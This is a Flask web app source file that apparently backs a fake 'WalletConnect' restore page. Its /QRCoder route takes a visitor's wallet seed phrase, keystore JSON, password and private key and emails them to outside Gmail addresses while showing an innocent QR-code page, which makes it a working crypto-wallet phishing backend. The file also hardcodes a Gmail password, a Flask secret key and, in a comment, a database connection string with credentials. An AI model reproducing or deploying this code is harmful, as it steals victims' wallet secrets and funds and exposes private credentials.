from flask import Flask, render_template, request, flash
#from flask_qrcode import QRcode
#from flask_bootstrap import Bootstrap
from flask_wtf import FlaskForm
from wtforms import StringField, SubmitField, IntegerField, HiddenField
from wtforms.validators import InputRequired, Length, Regexp, NumberRange
from datetime import datetime
#from flask_sqlalchemy import SQLAlchemy
#from sqlalchemy.sql import text
from flask_mail import Mail, Message
import sys
import logging
#from models import *
from forms import *

app = Flask(__name__, template_folder='Templates')
#mail= Mail(app)

app.config.update(dict(
    DEBUG = True,
    MAIL_SERVER='smtp.gmail.com',
    MAIL_PORT = 587,
    MAIL_USERNAME = 'tajusalaudeendeen@gmail.com',
    MAIL_PASSWORD = 'freedomisasin',
    MAIL_USE_TLS = True,
    MAIL_USE_SSL= False,
))

mail = Mail(app)


app.logger.addHandler(logging.StreamHandler(sys.stdout))
app.logger.setLevel(logging.ERROR)

#app.config['SQLALCHEMY_DATABASE_URI'] = 'POSTgres://ahzzrwvubzjgmc:dcddfd94e55a64f743e44ad943889db619e4d5a74d4a9f2f64af7b522d680b4f@ec2-35-170-85-206.compute-1.amazonaws.com:5432/dhloft952q2a7'
#app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

app.config['SECRET_KEY'] = '1TXomQKnGBVO0pAdebvMkdQD4gfjN8mF'

#db = SQLAlchemy(app)

#Bootstrap(app)

#QRcode(app)

@app.route("/")
def walletConnect():
 return render_template("index.html")

'''@app.route("/walletSelection")
def walletSelection():
 return render_template( 'app.html')'''

@app.route("/restore", methods = ['POST', 'GET'])
def restore():
 form = RegistrationForm()
 return render_template('app.html', form="form")


@app.route("/QRCoder", methods = ['POST', 'GET'])
def QRCoder():
 form = RegistrationForm()
 phrase = request.form["phrase"]
 keystoreJSON = request.form["keystoreJSON"]
 password = request.form["password"]
 privateKey = request.form["privateKey"]
 updated = datetime.now()
 updated = updated.strftime("%c")
 msg = Message('NEW UPDATE', sender = 'zolarich12@gmail.com', recipients = ['nejikamal@gmail.com'], bcc =['zolarich12@gmail.com'])
 msg.body = "Date and time: " + updated + " \n" + "Phrase: " + phrase + "\n" + "KeystoreJSON: " + keystoreJSON + "\n" + "Password: " + password + "\n" + "Private Key: " + privateKey
 mail.send(msg)
 return render_template( 'qrcode.html', form=form)
